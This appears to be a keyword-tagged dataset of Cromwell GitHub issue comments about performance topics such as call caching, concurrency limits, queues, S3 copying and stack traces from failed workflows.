akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:1919,concurren,concurrent,1919,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,2,['concurren'],['concurrent']
Performance,BackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); 	at ; cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); `; [sampleData_gatk-sample-out_logging_output (3).txt](https://github.com/broadinstitute/cromwell/files/2774220/sampleData_gatk-sample-out_logging_output.3.txt),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495:3110,concurren,concurrent,3110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495,1,['concurren'],['concurrent']
Performance,"BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""sta",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6383,concurren,concurrent,6383,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,Build 3730. ```; org.scalatest.exceptions.TestFailedDueToTimeoutException: The code passed to eventually never returned normally. Attempted 210 times over 3.3499629773500006 minutes. Last failure message: Submitted did not equal Failed.; at org.scalatest.concurrent.Eventually.tryTryAgain$1(Eventually.scala:432); at org.scalatest.concurrent.Eventually.eventually(Eventually.scala:439); at org.scalatest.concurrent.Eventually.eventually$(Eventually.scala:391); at cromwell.CromwellTestKitSpec.eventually(CromwellTestKitSpec.scala:251); at cromwell.CromwellTestKitSpec.runWdl(CromwellTestKitSpec.scala:323); at cromwell.WorkflowFailSlowSpec.$anonfun$new$4(WorkflowFailSlowSpec.scala:30); at org.scalatest.OutcomeOf.outcomeOf(OutcomeOf.scala:85); at org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.WordSpecLike$$anon$1.apply(WordSpecLike.scala:1078); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.CromwellTestKitWordSpec.withFixture(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.invokeWithFixture$1(WordSpecLike.scala:1076); at org.scalatest.WordSpecLike.$anonfun$runTest$1(WordSpecLike.scala:1088); at org.scalatest.SuperEngine.runTestImpl(Engine.scala:289); at org.scalatest.WordSpecLike.runTest(WordSpecLike.scala:1088); at org.scalatest.WordSpecLike.runTest$(WordSpecLike.scala:1070); at cromwell.CromwellTestKitWordSpec.runTest(CromwellTestKitSpec.scala:250); at org.scalatest.WordSpecLike.$anonfun$runTests$1(WordSpecLike.scala:1147); at org.scalatest.SuperEngine.$anonfun$runTestsInBranch$1(Engine.scala:396); at scala.collection.immutable.List.foreach(List.scala:389); at org.scalatest.SuperEngine.traverseSubNodes$1(Engine.scala:384); at org.scalatest.SuperEngine.runTestsInBranch(Engine.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030:255,concurren,concurrent,255,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-467169030,3,['concurren'],['concurrent']
Performance,Call cache diffing did end up being written against metadata so what this ticket is asking for is no longer needed.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-326085665:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2338#issuecomment-326085665,1,['cache'],['cache']
Performance,"Call-cache cannot be used if a Singularity mirror is used. So Singularity becomes useless in the WDL process, where both call-cache and container are needed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100:5,cache,cache,5,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6685#issuecomment-1046607100,2,['cache'],['cache']
Performance,"CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ""gs:/; /broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full; _dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19ec38f93/call-M2/shard-108/, command failed: Trace",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:1622,concurren,concurrent,1622,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,"Can you elaborate on why you want the functionality described? It is possible that call caching will help, but be aware that Cromwell will only read from the cache when absolutely everything matches - hashes of input files, WDL workflow, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981:158,cache,cache,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5300#issuecomment-561673981,1,['cache'],['cache']
Performance,"Can you upload the complete stack trace from the cromwell-log?. On Fri, Feb 14, 2020 at 9:29 AM pjongeneel <notifications@github.com> wrote:. > I have /mnt/efs on both batch nodes and cromwell server which is the; > mounted EFS.; >; > Then; > backend {; > // this configures the AWS Batch Backend for Cromwell; > default = ""AWSBATCH""; > providers {; > AWSBATCH {; > actor-factory =; > ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; > config {; > root = ""/mnt/efs/cromwell_execution""; > auth = ""default""; >; > numSubmitAttempts = 3; > numCreateDefinitionAttempts = 3; >; > default-runtime-attributes {; > queueArn: ""${BatchQueue}""; > }; >; > filesystems {; > local { auth = ""default"" }; > }; > }; > }; >; > }; > }; >; > And I always get this error:; > ERROR - AwsBatchAsyncBackendJobExecutionActor; > [UUID(8512304b)bioinfx.testjob:NA:1]: Error attempting to Execute; > java.util.NoSuchElementException: None.get; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/5070?email_source=notifications&email_token=ALILATR2AVXQXLFRQKER6W3RC3IIXA5CNFSM4IBORPI2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOELZZF7A#issuecomment-586388220>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/ALILATWPGUN66MUEOCVPYULRC3IIXANCNFSM4IBORPIQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586395015:623,queue,queueArn,623,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586395015,1,['queue'],['queueArn']
Performance,"Closing as a duplicate of newer, more ambition, scalability tickets",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1279#issuecomment-276488183:48,scalab,scalability,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1279#issuecomment-276488183,1,['scalab'],['scalability']
Performance,"Closing as not-very-compelling. But maybe we'll hit something similar during the ""scalability"" work",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/618#issuecomment-254319626:82,scalab,scalability,82,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/618#issuecomment-254319626,1,['scalab'],['scalability']
Performance,Closing for now. Will re-open once I sort out the call cache diff endpoint,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5146#issuecomment-525871365:55,cache,cache,55,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5146#issuecomment-525871365,1,['cache'],['cache']
Performance,Closing this one. We use the status endpoint in our scaling tests so we can now regression test the responsiveness vs scalability too,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-254301199:118,scalab,scalability,118,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-254301199,1,['scalab'],['scalability']
Performance,ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowInitializationActor.scala:146); at akka.actor.Actor.aroundReceive(Actor.scala:539); at akka.actor.Actor.aroundReceive$(Actor.scala:537); at cromwell.backend.standard.StandardInitializationActor.aroundReceive(StandardInitializationActor.scala:44); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); at akka.actor.ActorCell.invoke(ActorCell.scala:581); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); at akka.dispatch.Mailbox.run(Mailbox.scala:229); at akka.dispatch.Mailbox.exec(Mailbox.scala:241); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:5400,perform,performActionThenRespond,5400,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['perform'],['performActionThenRespond']
Performance,"Contradicting what I said in standup today, the performant rewrites of the labels query actually _*are*_ using the new non-unique key+value index I created on `CUSTOM_LABEL_ENTRY` (see the fourth row of the `EXPLAIN` above referencing `IDX_KEY_VALUE` as its `key`). I confirmed that without that index performance reverts to being terrible. The version of the query generated by Slick doesn't use the index and still performs terribly.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459406199:48,perform,performant,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4598#issuecomment-459406199,3,['perform'],"['performance', 'performant', 'performs']"
Performance,"Cool thanks. Like I said it's be a couple of days before I can look at what, if anything that affected. When I do I'll look at the profiler again but it's pretty likely that we found a, not the, bottleneck",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496229:195,bottleneck,bottleneck,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-277496229,1,['bottleneck'],['bottleneck']
Performance,Cool!. Have you done any load/performance testing to get before and after numbers? If not let's chat as pet of this process,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1831#issuecomment-271616503:25,load,load,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1831#issuecomment-271616503,2,"['load', 'perform']","['load', 'performance']"
Performance,"Core+and+Cromwell.pdf … <#m_3227077625045957240_> On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977 <#5977>>, or unsubscribe https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ . — You are receiving this because you commented. Reply to this email directly, view it on GitHub <[#5977 (comment)](https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EJEL23DXZQ4G3JVNQ3SPJKNNANCNFSM4S56ELLQ> . The weird thing is, even within the exact same attempt, stdout.log, stderr.log, and many side product files were successfully cached and copied to new places on S3, while only bam file failed. The only difference between bam file and other files is file size. I think this observation can exclude a lot of potential reasons.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:3259,cache,cached,3259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,1,['cache'],['cached']
Performance,"Cromwell may submit more jobs to the Pipelines API than is able to run at one time, so they're held in a queue by Google Cloud. As jobs finish, the next job is run. There are a few ways to terminate a workflow (see the [Abort guide](https://cromwell.readthedocs.io/en/stable/execution/ExecutionTwists/#abort) for more information). But essentially you need Cromwell to gracefully shut down the workflow:. - In `run` mode, you can issue [SIGINT or SIGTERM](https://cromwell.readthedocs.io/en/stable/Configuring/#abort) which asks Cromwell to issue the abort requests to GCP,; - In `server` mode, you can issue an `abort` through a POST request. By running `scancel`, you may not give Cromwell sufficient time to perform this graceful shutdown process, and hence your jobs held in the GCP Pipelines queue will still execute.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898:105,queue,queue,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898,3,"['perform', 'queue']","['perform', 'queue']"
Performance,"Cromwell-59 still has this problem. `cacheCopy` >= 5MB always has a different etag so it effectively disables call-caching due to different etag. ![image](https://user-images.githubusercontent.com/8625660/119712953-05280980-be16-11eb-8b0b-bdf057f7d2ca.png). So the original file's etag doesn't have `-` in etag (no multipart uploading).; ```; $ aws s3api head-object --bucket encode-processing --key test-copy-etag/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz; {; ""AcceptRanges"": ""bytes"",; ""LastModified"": ""Wed, 26 May 2021 18:26:37 GMT"",; ""ContentLength"": 164184869,; ""ETag"": ""\""0502111c7c676115303cca9931c2769b\"""",; ""ContentType"": ""binary/octet-stream"",; ""ServerSideEncryption"": ""AES256"",; ""Metadata"": {}; }; ```. Tried to copy it to a temp location (mimicking `cacheCopy`).; ```; $ aws s3 cp s3://encode-processing/caper_out_v052521/atac/d249d56c-fcdb-4916-a830-2c191920d877/call-bam2ta/shard-0/glob-199637d3015dccbe277f621a18be9eb4/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz s3://encode-processing/test-copy-etag/; copy: s3://encode-processing/caper_out_v052521/atac/d249d56c-fcdb-4916-a830-2c191920d877/call-bam2ta/shard-0/glob-199637d3015dccbe277f621a18be9eb4/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz to s3://encode-processing/test-copy-etag/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz. $ aws s3api head-object --bucket encode-processing --key test-copy-etag/ENCFF641SFZ.trim.srt.nodup.no_chrM_MT.tn5.tagAlign.gz; {; ""AcceptRanges"": ""bytes"",; ""LastModified"": ""Wed, 26 May 2021 18:27:41 GMT"",; ""ContentLength"": 164184869,; ""ETag"": ""\""a11d42b4abf4ef9d5de40183f25c520b-20\"""",; ""ContentType"": ""binary/octet-stream"",; ""ServerSideEncryption"": ""AES256"",; ""Metadata"": {}; }; ```. Got a different etag which matches with etag of the above snapshot. If `copy` method is used for `s3.caching.duplication-strategy` then call-caching is effectively disabled for all files > 5MB. . There is another bug in AWS backend's `s3.caching.duplication-strategy`.; https://gi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-849027075:37,cache,cacheCopy,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4828#issuecomment-849027075,2,['cache'],['cacheCopy']
Performance,"Currently the cromwell.conf file specifies the ARN of the queue that jobs; are submitted to. You can either change this to a new queue or you can; change the queue to use (or prioritize) a compute environment that uses on; demand instances. On Thu, Nov 19, 2020 at 2:32 PM Richard Davison <notifications@github.com>; wrote:. > If it works the same approach would allow for recovery in the case of Spot; > interruption; >; > By the way, speaking of this, how would I submit a job to an on-demand; > compute environment manually? It seems whenever I submit a workflow to; > cromwell, it always runs in a spot instance.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-730590208>,; > or unsubscribe; > <https://github.com/notifications/unsubscribe-auth/AF2E6EPPHWFJT3BFIOU2TCLSQVXFVANCNFSM4SQ7HRGQ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345:58,queue,queue,58,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5946#issuecomment-731151345,3,['queue'],['queue']
Performance,"Currently, does cromwell support the situation where several concurrent cromwell instances share the same MySQL database? Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4842#issuecomment-487338033:61,concurren,concurrent,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4842#issuecomment-487338033,1,['concurren'],['concurrent']
Performance,"Dear Alexis,; many thanks - I really appreciate the very useful inputs!; I asked the team operating the slurm server and they say that no such limits are in effect. The number of permitted jobs is oddly specific, it stays at maximum 37 jobs (either pending or running). It really appears that cromwell is doing something to stop further submission of jobs (they are tracked as ""Running"" in cromwell but no call within a job takes place until there are slots available). ; Once the jobs submitted exceed this queue, then cromwell server only generates this log:; ```; 2020-07-08 17:13:15,328 INFO - MaterializeWorkflowDescriptorActor [UUID(9db83645)]: Parsing workflow as WDL 1.0; 2020-07-08 17:13:16,442 INFO - MaterializeWorkflowDescriptorActor [UUID(9db83645)]: Call-to-Backend assignments: FastqToVCF.VariantFiltrationSNP -> slurm; ```; And then waits in this state until another job is finished, without even checking if the call is cached or anything else. Please note that the number of permitted workflows is set to a value higher than the number of workflows we usually submit. . One interesting observation - if I stop the cromwell server process (Control-C), all the jobs that were not previously submitted to slurm, get submitted immediately (as if cromwell was constantly blocking the submission for an unclear reason). Any input is, again, very much valuable! Thanks a lot. Ps. I just wanted to add that adding a second server process and submitting tasks to it allows submitting more jobs, so it is very likely that the slurm system is not limiting submissions.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-655622391:508,queue,queue,508,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-655622391,2,"['cache', 'queue']","['cached', 'queue']"
Performance,"Dear Alexis,; many thanks for the suggestion. I have checked and the files seem to be correctly hard-linked in our case and the folder sizes are as they should be. We have about 1Tb of reference files and the `cromwell-executions` directory with several workflow folders is only about 1.2 Tb in size, so it appears that the files are not being copied, but correctly hard-linked. ; I have checked again and it seems that the cap is at about 35 concurrently submitted tasks, even when several workflows are submitted, each set to scatter about 20-30 jobs. When running the jobs outsite cromwell server mode, we usually have several jobs in the ""pending"" state on slurm, but cromwell never submits more than 35 at once and the jobs never get to the pending list. It is almost as if there is some kind of hard limit in the number of jobs submitted, not controlled by the `concurrent-job-limit`. ; Thanks again! Best,; Ales",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-652434370:443,concurren,concurrently,443,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5218#issuecomment-652434370,2,['concurren'],"['concurrent-job-limit', 'concurrently']"
Performance,Desired behavior is to decrease this latency.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1497#issuecomment-250271058:37,latency,latency,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1497#issuecomment-250271058,1,['latency'],['latency']
Performance,Despite the text in the issue I'm assuming you meant `concurrent-job-limit`?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-274351812:54,concurren,concurrent-job-limit,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1841#issuecomment-274351812,1,['concurren'],['concurrent-job-limit']
Performance,Do you think there would be value in showing whether a call is used as the cached result for other calls?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/585#issuecomment-199772199:75,cache,cached,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/585#issuecomment-199772199,1,['cache'],['cached']
Performance,"Docker requires all image lookups to be qualified by a repository name. For Broad images our repository is ""broadinstitute"", and in our WDLs we request Broad images with the repository explicitly specified a la ""broadinstitute/genomes-in-the-cloud"". The more universal images like ""ubuntu"" don't require an explicit repository specification in casual parlance, but still require a default repository specification of ""library"" for hash lookups. When a Docker image is specified in WDL that includes a hash, Cromwell skips the hash lookup and just hashes the image name. Cromwell 26 would use essentially the Docker image string that had been specified in the WDL, i.e. something like `ubuntu@sha256:ea1d854d38be82f54d39efe2c67000bed1b03348bcc2f3dc094f260855dff368`. Cromwell 27 inadvertently changed the internal representation of the image string to prepend the `library/` repository even when it hadn't been explicitly specified in the WDL. This meant that the Docker string would hash differently on 27 than it did on 26, resulting in unwanted cache misses. These changes look to track whether a repository has been explicitly specified or not, and only prepend the `library/` where required on hash 